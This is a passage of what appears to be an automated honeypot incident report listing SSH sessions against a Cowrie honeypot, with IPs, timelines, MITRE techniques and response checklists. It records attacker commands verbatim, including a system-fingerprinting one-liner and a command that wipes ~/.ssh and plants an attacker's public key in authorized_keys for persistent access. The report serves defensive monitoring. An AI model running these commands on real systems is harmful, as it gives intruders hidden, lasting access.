| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:43:02` | `cowrie.session.connect` |
| `2026-07-08 04:43:03` | `cowrie.client.version` |
| `2026-07-08 04:43:03` | `cowrie.client.kex` |
| `2026-07-08 04:43:05` | `cowrie.login.success` |
| `2026-07-08 04:43:06` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4381314c69b6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:43 |
| **Last Seen** | 2026-07-08 04:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:43:05` | `cowrie.session.connect` |
| `2026-07-08 04:43:05` | `cowrie.client.version` |
| `2026-07-08 04:43:05` | `cowrie.client.kex` |
| `2026-07-08 04:43:06` | `cowrie.login.success` |
| `2026-07-08 04:43:07` | `cowrie.session.params` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.success` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.command.input` |
| `2026-07-08 04:43:07` | `cowrie.log.closed` |
| `2026-07-08 04:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac5594e1b32

| Field | Detail |
|---|---|
| **Source IP** | `192.155.90[.]118` |
| **First Seen** | 2026-07-08 04:43 |
| **Last Seen** | 2026-07-08 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:43:46` | `cowrie.session.connect` |
| `2026-07-08 04:43:46` | `cowrie.login.success` |
| `2026-07-08 04:43:47` | `cowrie.session.params` |
| `2026-07-08 04:43:47` | `cowrie.command.input` |
| `2026-07-08 04:43:47` | `cowrie.command.input` |
| `2026-07-08 04:43:47` | `cowrie.command.failed` |
| `2026-07-08 04:43:47` | `cowrie.command.input` |
| `2026-07-08 04:43:47` | `cowrie.command.failed` |
| `2026-07-08 04:43:47` | `cowrie.command.input` |
| `2026-07-08 04:43:47` | `cowrie.log.closed` |
| `2026-07-08 04:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.155.90[.]118` to AbuseIPDB if not already reported
- [ ] Block `192.155.90[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e67f6d7f52

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-07-08 04:44 |
| **Last Seen** | 2026-07-08 04:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:44:25` | `cowrie.session.connect` |
| `2026-07-08 04:44:27` | `cowrie.client.version` |
| `2026-07-08 04:44:27` | `cowrie.client.kex` |
| `2026-07-08 04:44:30` | `cowrie.login.success` |
| `2026-07-08 04:44:31` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212f144307ee

| Field | Detail |
|---|---|
| **Source IP** | `181.129.31[.]42` |
| **First Seen** | 2026-07-08 04:44 |
| **Last Seen** | 2026-07-08 04:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:44:36` | `cowrie.session.connect` |
| `2026-07-08 04:44:36` | `cowrie.client.version` |
| `2026-07-08 04:44:36` | `cowrie.client.kex` |
| `2026-07-08 04:44:38` | `cowrie.login.success` |
| `2026-07-08 04:44:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `181.129.31[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfb7e2f3a84

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:45 |
| **Last Seen** | 2026-07-08 04:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:45:00` | `cowrie.session.connect` |
| `2026-07-08 04:45:00` | `cowrie.client.version` |
| `2026-07-08 04:45:00` | `cowrie.client.kex` |
| `2026-07-08 04:45:01` | `cowrie.login.success` |
| `2026-07-08 04:45:02` | `cowrie.session.params` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.success` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.command.input` |
| `2026-07-08 04:45:02` | `cowrie.log.closed` |
| `2026-07-08 04:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea6e0a9b7364

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 04:46 |
| **Last Seen** | 2026-07-08 04:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:46:11` | `cowrie.session.connect` |
| `2026-07-08 04:46:12` | `cowrie.client.version` |
| `2026-07-08 04:46:12` | `cowrie.client.kex` |
| `2026-07-08 04:46:18` | `cowrie.login.success` |
| `2026-07-08 04:46:22` | `cowrie.session.params` |
| `2026-07-08 04:46:22` | `cowrie.command.input` |
| `2026-07-08 04:46:23` | `cowrie.log.closed` |
| `2026-07-08 04:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f54ad2bd9b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:46 |
| **Last Seen** | 2026-07-08 04:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:46:44` | `cowrie.session.connect` |
| `2026-07-08 04:46:45` | `cowrie.client.version` |
| `2026-07-08 04:46:45` | `cowrie.client.kex` |
| `2026-07-08 04:46:45` | `cowrie.login.success` |
| `2026-07-08 04:46:46` | `cowrie.session.params` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.success` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:46` | `cowrie.command.input` |
| `2026-07-08 04:46:47` | `cowrie.log.closed` |
| `2026-07-08 04:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de51502fbca4

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-07-08 04:46 |
| **Last Seen** | 2026-07-08 04:51 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:46:50` | `cowrie.session.connect` |
| `2026-07-08 04:46:50` | `cowrie.client.version` |
| `2026-07-08 04:46:50` | `cowrie.client.kex` |
| `2026-07-08 04:46:52` | `cowrie.login.success` |
| `2026-07-08 04:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c61799c39b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:48 |
| **Last Seen** | 2026-07-08 04:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:48:36` | `cowrie.session.connect` |
| `2026-07-08 04:48:36` | `cowrie.client.version` |
| `2026-07-08 04:48:36` | `cowrie.client.kex` |
| `2026-07-08 04:48:37` | `cowrie.login.success` |
| `2026-07-08 04:48:38` | `cowrie.session.params` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.success` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.command.input` |
| `2026-07-08 04:48:38` | `cowrie.log.closed` |
| `2026-07-08 04:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a9e0c63503

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-07-08 04:48 |
| **Last Seen** | 2026-07-08 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:48:56` | `cowrie.session.connect` |
| `2026-07-08 04:48:56` | `cowrie.client.version` |
| `2026-07-08 04:48:56` | `cowrie.client.kex` |
| `2026-07-08 04:48:56` | `cowrie.login.success` |
| `2026-07-08 04:48:57` | `cowrie.session.params` |
| `2026-07-08 04:48:57` | `cowrie.command.input` |
| `2026-07-08 04:48:57` | `cowrie.command.failed` |
| `2026-07-08 04:48:57` | `cowrie.log.closed` |
| `2026-07-08 04:48:58` | `cowrie.session.params` |
| `2026-07-08 04:48:58` | `cowrie.command.input` |
| `2026-07-08 04:48:58` | `cowrie.session.file_download` |
| `2026-07-08 04:48:58` | `cowrie.log.closed` |
| `2026-07-08 04:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e866eb7c11aa

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-07-08 04:48 |
| **Last Seen** | 2026-07-08 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:48:58` | `cowrie.session.connect` |
| `2026-07-08 04:48:58` | `cowrie.client.version` |
| `2026-07-08 04:48:58` | `cowrie.client.kex` |
| `2026-07-08 04:48:58` | `cowrie.login.success` |
| `2026-07-08 04:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9fcd27fe8e

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-07-08 04:48 |
| **Last Seen** | 2026-07-08 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:48:59` | `cowrie.session.connect` |
| `2026-07-08 04:48:59` | `cowrie.client.version` |
| `2026-07-08 04:48:59` | `cowrie.client.kex` |
| `2026-07-08 04:48:59` | `cowrie.login.success` |
| `2026-07-08 04:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db19c04e47f

| Field | Detail |
|---|---|
| **Source IP** | `20.157.117[.]15` |
| **First Seen** | 2026-07-08 04:49 |
| **Last Seen** | 2026-07-08 04:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:49:16` | `cowrie.session.connect` |
| `2026-07-08 04:49:16` | `cowrie.client.version` |
| `2026-07-08 04:49:17` | `cowrie.client.kex` |
| `2026-07-08 04:49:18` | `cowrie.login.success` |
| `2026-07-08 04:49:19` | `cowrie.session.params` |
| `2026-07-08 04:49:19` | `cowrie.command.input` |
| `2026-07-08 04:49:19` | `cowrie.command.failed` |
| `2026-07-08 04:49:19` | `cowrie.log.closed` |
| `2026-07-08 04:49:20` | `cowrie.session.params` |
| `2026-07-08 04:49:20` | `cowrie.command.input` |
| `2026-07-08 04:49:20` | `cowrie.session.file_download` |
| `2026-07-08 04:49:20` | `cowrie.log.closed` |
| `2026-07-08 04:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.157.117[.]15` to AbuseIPDB if not already reported
- [ ] Block `20.157.117[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c60f57cd35

| Field | Detail |
|---|---|
| **Source IP** | `20.157.117[.]15` |
| **First Seen** | 2026-07-08 04:49 |
| **Last Seen** | 2026-07-08 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:49:20` | `cowrie.session.connect` |
| `2026-07-08 04:49:20` | `cowrie.client.version` |
| `2026-07-08 04:49:21` | `cowrie.client.kex` |
| `2026-07-08 04:49:22` | `cowrie.login.success` |
| `2026-07-08 04:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.157.117[.]15` to AbuseIPDB if not already reported
- [ ] Block `20.157.117[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b98220d1938e

| Field | Detail |
|---|---|
| **Source IP** | `20.157.117[.]15` |
| **First Seen** | 2026-07-08 04:49 |
| **Last Seen** | 2026-07-08 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:49:22` | `cowrie.session.connect` |
| `2026-07-08 04:49:22` | `cowrie.client.version` |
| `2026-07-08 04:49:22` | `cowrie.client.kex` |
| `2026-07-08 04:49:23` | `cowrie.login.success` |
| `2026-07-08 04:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.157.117[.]15` to AbuseIPDB if not already reported
- [ ] Block `20.157.117[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a5f22dc301

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:50 |
| **Last Seen** | 2026-07-08 04:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:50:20` | `cowrie.session.connect` |
| `2026-07-08 04:50:20` | `cowrie.client.version` |
| `2026-07-08 04:50:20` | `cowrie.client.kex` |
| `2026-07-08 04:50:22` | `cowrie.login.success` |
| `2026-07-08 04:50:23` | `cowrie.session.params` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.success` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.command.input` |
| `2026-07-08 04:50:23` | `cowrie.log.closed` |
| `2026-07-08 04:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91e3395b5d4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:51 |
| **Last Seen** | 2026-07-08 04:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:51:45` | `cowrie.session.connect` |
| `2026-07-08 04:51:46` | `cowrie.client.version` |
| `2026-07-08 04:51:46` | `cowrie.client.kex` |
| `2026-07-08 04:51:48` | `cowrie.login.success` |
| `2026-07-08 04:51:50` | `cowrie.session.params` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
